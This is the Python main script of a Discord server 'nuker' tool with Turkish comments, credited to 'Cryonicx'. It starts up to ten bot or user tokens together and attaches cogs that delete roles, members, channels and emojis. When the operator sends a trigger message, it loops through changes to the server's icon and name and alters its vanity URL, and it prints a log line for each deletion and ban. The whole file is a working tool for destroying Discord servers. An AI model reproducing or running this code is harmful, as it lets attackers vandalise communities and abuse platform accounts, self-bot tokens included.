import asyncio , time ,json ,os , progressbar
from discord.ext import commands

#Cogs
import cogs.roledelete , cogs.userdelete , cogs.channeldelete , cogs.emojidelete

cogs = [cogs.roledelete , cogs.userdelete , cogs.channeldelete , cogs.userdelete , cogs.emojidelete]

config = json.loads(open('config/set.json', 'r', encoding='utf-8').read())

tok = config["tokens"]["tokens"]

botmu = config["required"]["Bot?"]
 

#Progress bar  
def wait_bro():
      
    sikildim = ['{} Tokenle giriş yapılıyor '.format(len(tok)), progressbar.AnimatedMarker()]
    bar = progressbar.ProgressBar(widgets=sikildim).start()
      
    for i in range(50):
        time.sleep(0.1)
        bar.update(i)
    
    os.system('cls' if os.name == 'nt' else 'clear')

          
wait_bro()

#İntro
print(
f"""

 ██████ ██████  ██    ██  ██████  ███    ██ ██  ██████ ██   ██  
██      ██   ██  ██  ██  ██    ██ ████   ██ ██ ██       ██ ██  
██      ██████    ████   ██    ██ ██ ██  ██ ██ ██        ███   
██      ██   ██    ██    ██    ██ ██  ██ ██ ██ ██       ██ ██  
 ██████ ██   ██    ██     ██████  ██   ████ ██  ██████ ██   ██ 
                
Botu başlatmak için işlem yapmak istediğiniz sunucunun herhangi bir kanalına {config["names"]["patlatmamesajı"]} yazmanız yeterlidir iyi eğlenceler..

""")


#Client
client = commands.Bot(command_prefix='.')

client2 = commands.Bot(command_prefix='.')

client3 = commands.Bot(command_prefix='.')

client4 = commands.Bot(command_prefix='.')

client5 = commands.Bot(command_prefix='.')

client6 = commands.Bot(command_prefix='.')

client7 = commands.Bot(command_prefix='.')

client8 = commands.Bot(command_prefix='.')

client9 = commands.Bot(command_prefix='.')

client10 = commands.Bot(command_prefix='.')


#Remove
client.remove_command('help')

client2.remove_command('help')

client3.remove_command('help')

client4.remove_command('help')

client5.remove_command('help')

client6.remove_command('help')

client7.remove_command('help')

client8.remove_command('help')

client9.remove_command('help')

client10.remove_command('help')



# Ready 
@client.event
async def on_ready():
    print("Bot: {}  ping: {}".format(client.user,int(client.latency*1000)))


@client2.event
async def on_ready():
    print("Bot: {}  ping: {}".format(client2.user,int(client2.latency*1000)))


@client3.event
async def on_ready():
    print("Bot: {}  ping: {}".format(client3.user,int(client3.latency*1000)))

@client4.event
async def on_ready():
    print("Bot: {}  ping: {}".format(client4.user,int(client4.latency*1000)))

@client5.event
async def on_ready():
    print("Bot: {}  ping: {}".format(client5.user,int(client5.latency*1000)))

@client6.event
async def on_ready():
    print("Bot: {}  ping: {}".format(client6.user,int(client6.latency*1000)))

@client7.event
async def on_ready():
    print("Bot: {}  ping: {}".format(client7.user,int(client7.latency*1000)))

@client8.event
async def on_ready():
    print("Bot: {}  ping: {}".format(client8.user,int(client8.latency*1000)))

@client9.event
async def on_ready():
    print("Bot: {}  ping: {}".format(client9.user,int(client9.latency*1000)))

@client10.event
async def on_ready():
    print("Bot: {}  ping: {}".format(client10.user,int(client10.latency*1000)))


#Logs
@client.event
async def on_guild_channel_delete(channel):
    guild = client.get_guild(int(config["guildid"]))
    print("[ {} ] Sunucusundan [ {} ] kanalı silindi.".format(guild.name,channel.name))

@client.event
async def on_guild_role_delete(role):
    guild = client.get_guild(int(config["guildid"]))
    print("[ {} ] Sunucusundan [ {} ] rolü silindi.".format(guild.name,role.name))

@client.event
async def on_member_ban(member):
    guild = client.get_guild(int(config["guildid"]))
    print("[ {} ] Sunucusundan [ {} ] üyesi banlandı.".format(guild.name,member.name))





#Change guild icon
@client.event
async def on_message(message):
    if message.author.id == int(config["sizinid"]):
        if config["names"]["patlatmamesajı"] in message.content:
            with open('./images/image1.png', 'rb') as f:
                icon2 = f.read()

            with open('./images/image2.png', 'rb') as f:
                icon = f.read()
            try:
                a = +1
                while a == 1:
                    await message.guild.edit(icon=icon)
                    await message.guild.edit(icon=icon2)
            except Exception as e:
                print("Sunucu iconu {} nedeniyle değiştirilemedi.".foramt(e))
    else:
        await client.process_commands(message)

#Change Guild name
@client.event
async def on_message(message):
    if message.author.id == int(config["sizinid"]):
        if config["names"]["patlatmamesajı"] in message.content:
            a = +1
            while a == 1:
                try:
                    guildname = config["names"]["sunucuismi"]
                    for x in guildname:
                        await message.guild.edit(name=x)
                except Exception as e:
                    print("Sunucu ismi {} nedeniyle değiştirilemedi".format(e))

    else:
        await client.process_commands(message)


#Change Guild Vanity Url
@client2.event
async def on_message(message):
    if message.author.id == int(config["sizinid"]):
        if config["names"]["patlatmamesajı"] in message.content:
            try:
                vanit = config["names"]["sunucu_vanity_url"]
                await message.guild.edit(vanity_code=vanit)
            except Exception as e:
                print("Orsopu evladı sunucu urlsi yok neyi degisiyon")            


#COGS SETUP
for i in range(len(cogs)):
    cogs[i].setup(client)

for i in range(len(cogs)):
    cogs[i].setup(client2)

for i in range(len(cogs)):
    cogs[i].setup(client3)

for i in range(len(cogs)):
    cogs[i].setup(client4)

for i in range(len(cogs)):
    cogs[i].setup(client5)

for i in range(len(cogs)):
    cogs[i].setup(client6)

for i in range(len(cogs)):
    cogs[i].setup(client7)

for i in range(len(cogs)):
    cogs[i].setup(client8)

for i in range(len(cogs)):
    cogs[i].setup(client9)

for i in range(len(cogs)):
    cogs[i].setup(client10)





#Multiple token system Developed by Cryonicx.

if len(tok[0]) == 59:
    cryonicx = []
    if botmu:
        try:
            cryonicx.append(client.start(tok[0],bot=True))
        except Exception as e:
            print("Token hatası:\n {}".format(e))
        if len(tok) >= 2:
            try:
                cryonicx.append(client2.start(tok[1],bot=True))
            except Exception as e:
                print("Token hatası:\n {}".format(e))
        if len(tok) >= 3:
            try:
                cryonicx.append(client3.start(tok[2],bot=True))
            except Exception as e:
                print("Token hatası:\n {}".format(e))
        if len(tok) >= 4:
            try:
                cryonicx.append(client4.start(tok[3],bot=True))
            except Exception as e:
                print("Token hatası:\n {}".format(e))
        if len(tok) >= 5:
            try:
                cryonicx.append(client5.start(tok[4],bot=True))
            except Exception as e:
                print("Token hatası:\n {}".format(e))
        if len(tok) >= 6:
            try:
                cryonicx.append(client6.start(tok[5],bot=True))
            except Exception as e:
                print("Token hatası:\n {}".format(e))
        if len(tok) >= 7:
            try:
                cryonicx.append(client7.start(tok[6],bot=True))
            except Exception as e:
                print("Token hatası:\n {}".format(e))
        if len(tok) >= 8:
            try:
                cryonicx.append(client8.start(tok[7],bot=True))
            except Exception as e:
                print("Token hatası:\n {}".format(e))
        if len(tok) >= 9:
            try:
                cryonicx.append(client9.start(tok[8],bot=True))
            except Exception as e:
                print("Token hatası:\n {}".format(e))
        if len(tok) >= 10:
            try:
                cryonicx.append(client10.start(tok[9],bot=True))
            except Exception as e:
                print("Token hatası:\n {}".format(e))
            
    else:
        try:
            cryonicx.append(client.start(tok[0],bot=False))
        except Exception as e:
                print("Token hatası:\n {}".format(e))
        if len(tok) >= 2:
            try:
                cryonicx.append(client2.start(tok[1],bot=False))
            except Exception as e:
                print("Token hatası:\n {}".format(e))
        if len(tok) >= 3:
            try:
                cryonicx.append(client3.start(tok[2],bot=False))
            except Exception as e:
                print("Token hatası:\n {}".format(e))
        if len(tok) >= 4:
            try:
                cryonicx.append(client4.start(tok[3],bot=False))
            except Exception as e:
                print("Token hatası:\n {}".format(e))
        if len(tok) >= 5:
            try:
                cryonicx.append(client5.start(tok[4],bot=False))
            except Exception as e:
                print("Token hatası:\n {}".format(e))
        if len(tok) >= 6:
            try:
                cryonicx.append(client6.start(tok[5],bot=False))
            except Exception as e:
                print("Token hatası:\n {}".format(e))
        if len(tok) >= 7:
            try:
                cryonicx.append(client7.start(tok[6],bot=False))
            except Exception as e:
                print("Token hatası:\n {}".format(e))
        if len(tok) >= 8:
            try:
                cryonicx.append(client8.start(tok[7],bot=False))
            except Exception as e:
                print("Token hatası:\n {}".format(e))
        if len(tok) >= 9:
            try:
                cryonicx.append(client9.start(tok[8],bot=False))
            except Exception as e:
                print("Token hatası:\n {}".format(e))
        if len(tok) >= 10:
            try:
                cryonicx.append(client10.start(tok[9],bot=False))
            except Exception as e:
                print("Token hatası:\n {}".format(e))
    asyncio.get_event_loop().run_until_complete(asyncio.gather(*cryonicx))

    if len(tok) >= 11:
        print("Program en fazla 10 tokeni desteklemektedir token sayısını arttırmak için lütfen CryonicX#4177 ulaşın.")
        time.sleep(3)
        quit()
